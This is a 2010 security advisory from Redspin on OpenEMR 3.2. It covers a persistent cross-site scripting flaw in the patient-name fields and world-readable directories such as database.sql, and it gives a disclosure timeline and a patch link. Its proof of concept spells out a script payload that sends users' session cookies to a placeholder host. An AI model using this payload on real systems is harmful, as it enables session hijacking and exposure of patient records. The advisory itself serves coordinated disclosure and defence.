@@ -1,0 +1,116 @@
+Redspin Security Notice -- RSN-2010-01
+Multiple vulnerabilities in OpenEMR Electronic Medical Record Software
+
+Overview
+----------------
+Quote from http://www.oemr.org/
+OpenEMR is a free medical practice management, electronic medical records,
+prescription writing, and medical billing application. These programs are
+also
+referred to as electronic health records. OpenEMR is licensed under the
+General
+Gnu Public License (General GPL). It is a free open source replacement for
+medical applications such as Medical Manager, Health Pro, and Misys. It
+features
+support for EDI billing to clearing houses such as Availity, MD-Online,
+MedAvant
+and ZirMED using ANSI X12.
+
+Description
+----------------
+An issue was discovered with the OpenEMR standard installation.
+
+There exists a persistent cross-site scripting (XSS) attack vector,
+in which a patient may be maliciously named in a way that will send session
+data
+to a third party web host.
+
+
+Details
+----------------
+Vulnerable Product : OpenEMR 3.2
+Vulnerability Type : Session-stealing XSS & Directory Listing
+Discovered by      : David Shaw (dshaw () redspin com)
+
+
+Timeline
+----------------
+Bug Discovered        :  May 14, 2010
+Vendor Advised        :  June 1, 2010
+Vendor Response       :  June 2, 2010
+Patch Released        :  June 2, 2010
+Public Disclosure     :  June 23, 2010
+
+Analysis
+----------------
+Due to an incorrectly sanitized input in the "patient name" field, it is
+possible to create a malformed patient name that will translate into a
+persistent cross site scripting exploit.
+
+Due to the nature of the form, "First Name" and "Last Name" are reversed in
+the
+resulting output. As such, the Javascript injection must start on "last
+name"
+and continue on to "first name."
+
+Furthermore, there is a comma in between these two outputs which must be
+taken
+into account by inserting Javascript comments between the two injections. A
+working demonstration of this persistent XSS is available in the "Proof of
+Concept" section of this notice.
+
+In addition to the cross-site scripting vulnerability, certain sensitive
+directories are open by default and world-readable. For example, the
+database.sql file may be read at http://server/openemr/sql/database.sql
+
+Proof of Concept
+----------------
+
+Bug #1: Persistent Cross-Site Scripting
+~~~~~~~~~~~~~~~~~~~~~~~
+
+Once logged into OpenEMR, navigate to Management->New/Search. The resulting
+menu will have form inputs for patient information. The malicious
+input is as follows:
+
+(First Name): */I.src='http://SERVER.IP/'+encodeURI(C);</script>
+(Last Name): <script>var C=document.cookie;var I=new Image; /*
+
+The resulting statement in the output is:
+<script>
+  var C=document.cookie;
+  var I=new Image;
+  /*, */
+  I.src='http://SERVER.IP/'+encodeURI(C);
+</script>
+
+When this patient has been inserted, it will show up as a blank name in the
+patient database. However, when any user attempts to search for a patient
+or view the list of existing patients, his session ID is sent (silently)
+to web server logs (in this case, to SERVER.IP).
+
+
+Solution
+----------------
+A patch was released on June 2, 2010 which mitigates this persistent
+cross-site
+scripting attack vector. This script is located on OpenEMR's Sourceforge
+page:
+
+http://sourceforge.net/tracker/index.php?func=detail&aid=3010645&group_id=60081&atid=493003
+
+
+Additional Notes
+----------------
+As part of its response to this problem, the OpenEMR project released an
+early
+version of this advisory on their Sourceforge developer forum. The original
+thread is located at:
+
+https://sourceforge.net/projects/openemr/forums/forum/202506/topic/3530656
+
+Out of respect for OpenEMR developers, the release of this advisory was
+postponed
+until a working patch was released out--despite having an already made the
+advisory
+public by their own choice.
